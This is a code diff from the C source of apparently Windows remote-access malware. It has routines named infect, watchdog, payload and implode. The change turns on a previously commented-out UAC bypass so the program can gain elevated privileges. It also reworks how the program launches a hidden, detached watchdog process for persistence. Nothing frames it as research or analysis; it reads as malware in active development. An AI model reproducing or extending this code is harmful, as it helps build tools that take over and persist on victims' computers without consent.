@@ -18,8 +18,7 @@ void implode();
 int main(int argc, char * argv[]){
     if(argc == 1){ infect(); } else
     if(strcmp(argv[1], "-watchdog") == 0){ watchdog(argv); } else 
-    if(strcmp(argv[1], "-starter") == 0){ starter(argv); } else 
-    if(strcmp(argv[1], "-watchdogStarter") == 0){ watchdogStarter(argv); } else 
+    if(strcmp(argv[1], "-starter") == 0){ Starter(argv[2], argv[3]); } else 
     if(strcmp(argv[1], "-payload") == 0){ payload(); } else
     if(strcmp(argv[1], "-implode") == 0){ implode(); }
 
@@ -36,17 +35,15 @@ void infect(){
 
     
     /* Try to aquire elevated privileges */
-    // if(!IsElevated()){
-    //     MessageBoxA(NULL, "Not elevated", "Error", MB_ICONINFORMATION | MB_OK | MB_TOPMOST);
-    //     if(!BypassUAC(path)){
-    //         printf("Failed to elevate privileges, continue\n");
-    //     } else {
-    //         printf("Elevation successfull\n");
-    //         exit(0);
-    //     }
-    // } else {
-    //     MessageBoxA(NULL, "Elevated", "Error", MB_ICONINFORMATION | MB_OK | MB_TOPMOST);
-    // }
+    if(!IsElevated()){
+        if(!BypassUAC(path)){
+            printf("Failed to elevate privileges, continue\n");
+        } else {
+            printf("Elevation successfull\n");
+            exit(0);
+        }
+        /* TODO: Check if WD was triggered */
+    }
 
 
     /* Copy all the executables */
@@ -131,37 +128,7 @@ void infect(){
     // Start the watchdog process
     printf("%s\n", watchdogDestination);
     
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    // Initialize STARTUPINFO and PROCESS_INFORMATION structs
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-
-    char commandLine[128];
-    strcpy(commandLine, "\"");
-    strcat(commandLine, watchdogDestination);
-    strcat(commandLine, "\" -watchdogStarter");
-    // Create the process with no inherited handles, custom environment, and no working directory inheritance
-    if (CreateProcessA(
-            NULL,           // Path to executable
-            commandLine,            // Command line arguments
-            NULL,                          // Process security attributes
-            NULL,                          // Thread security attributes
-            FALSE,                         // Don't inherit handles
-            DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW, // Start in a new console (optional)
-            NULL,                          // No custom environment
-            NULL,                          // Don't inherit current directory
-            &si,                           // Startup information
-            &pi)                           // Process information
-    ) {
-        printf("Process created successfully.\n");
-        // Close process and thread handles
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    } else {
-        printf("CreateProcess failed. Error: %lu\n", GetLastError());
-    }
+    StartProgram(watchdogDestination, watchdogDestination, "-watchdog");
 }
 
 // Remove the RAT
